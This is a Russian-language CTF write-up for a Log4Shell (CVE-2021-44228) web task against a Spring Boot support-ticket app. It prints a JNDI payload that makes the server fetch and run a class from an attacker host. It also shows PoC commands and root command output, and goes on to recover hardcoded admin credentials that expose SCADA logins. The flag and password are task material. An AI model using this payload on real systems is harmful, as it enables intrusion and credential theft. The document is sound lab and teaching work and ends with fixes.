# Tickets — Writeup

**Log4Shell (CVE-2021-44228) → RCE → захват флага, пост-эксплуатация до учёток SCADA**

Веб-таск · Сложность: Easy · Стек: Spring Boot 2.6.1 + Thymeleaf + log4j2 2.14.1

## О таске

Сервис техподдержки «TechSupport Pro»: пользователь создаёт обращения (тема + текст), админ отвечает. Данные хранятся в памяти приложения, без БД. Цель — получить RCE и флаг, затем развить до учётных данных SCADA.

## Разведка

Запрос к несуществующему пути отдаёт стандартную `Whitelabel Error Page` — признак **Spring Boot**. Spring Boot приложения часто используют log4j2; версия `2.14.1` уязвима к **Log4Shell**.

## Уязвимость

Форма создания обращения (`POST /create`) логирует пользовательский ввод напрямую через log4j, без санитизации:

```java
// AppealController.java
String subject = request.getParameter("subject");
String content = request.getParameter("content");
logger.info("Создание обращения. Тема: " + subject + ", Содержание: " + content);
```

В log4j 2.14.1 строки сообщения проходят через подстановку `${...}`, включая JNDI-lookup `${jndi:ldap://...}`. Значит, отправив такой payload в поле `content`, можно заставить сервер обратиться к нашему LDAP-серверу и загрузить произвольный класс → **удалённое выполнение кода**. Авторизация для `/create` не требуется.

## Эксплуатация

Схема: payload в `/create` → log4j делает JNDI-запрос к нашему **rogue LDAP** → тот возвращает ссылку на класс на нашем **HTTP** → уязвимая JVM скачивает и загружает `Exploit.class` → срабатывает `static`-блок → выполняется команда и её вывод уходит нам (exfil).

Payload (команда `whoami` в Base64, как в оригинальной технике, здесь — прямой JNDI):

```
${jndi:ldap://<attacker>:1389/Exploit}
```

Автоматизировано в [`poc/exploit.sh`](poc/exploit.sh) (компонента: [`Exploit.java`](poc/Exploit.java) — полезная нагрузка, [`rogue_server.py`](poc/rogue_server.py) — минимальный LDAP+HTTP на stdlib):

```bash
cd tickets && docker compose up -d --build   # поднять стенд
bash writeup/poc/exploit.sh
```
```text
[*] шлю payload на /create: ${jndi:ldap://attacker:1389/Exploit}
    POST /create -> 200
[+] вывод команды с жертвы (RCE):
    errypie{jndi_r41n_0f_sh3lls_e2d9}
    uid=0(root) gid=0(root) groups=0(root)
```

Команда `id; cat /flag.txt` выполнена на сервере от **root**.

**Флаг:** `errypie{jndi_r41n_0f_sh3lls_e2d9}`

> Примечание по стенду: на современных JDK загрузка удалённого класса по JNDI отключена по умолчанию, поэтому в `Dockerfile` намеренно выставлен `-Dcom.sun.jndi.ldap.object.trustURLCodebase=true` — чтобы воспроизвести поведение старой JDK (как на боевом Debian 11). Классический payload с локальным гаджетом (Tomcat BeanFactory, напр. JNDIExploit) сработал бы и без этого флага.

## Пост-эксплуатация (SCADA-вектор)

На сервере нет БД — все данные, включая учётку админа, живут в приложении. После RCE выгружаем jar и декомпилируем. В `AdminController` логин/пароль захардкожены:

```java
private static final String ADMIN_LOGIN = "admin";
private static final String ADMIN_PASSWORD = "Yell0w_K1ng3241";
```

Входим в админ-панель (`/admin/login`) и в списке обращений находим тикет, в ответе на который лежат учётные данные от системы SCADA.

## Причина и исправление

- **Причина 1 (RCE):** уязвимая `log4j-core 2.14.1` + логирование непроверенного пользовательского ввода.
  **Фикс:** обновить log4j до ≥ 2.17.1 (или Spring Boot ≥ 2.6.2); как временная мера — `-Dlog4j2.formatMsgNoLookups=true` и не логировать сырой пользовательский ввод.
- **Причина 2 (SCADA):** учётные данные захардкожены в коде и достаются декомпиляцией.
  **Фикс:** хранить секреты вне кода (переменные окружения / секрет-хранилище), не класть чувствительные данные в тикеты.

## Состав

```
pom.xml, src/                восстановленные исходники (из декомпиляции jar)
prebuilt/tickets(log4j).jar  исходный собранный артефакт
Dockerfile, docker-compose   запуск стенда
writeup/poc/                 Exploit.java, rogue_server.py, exploit.sh
```
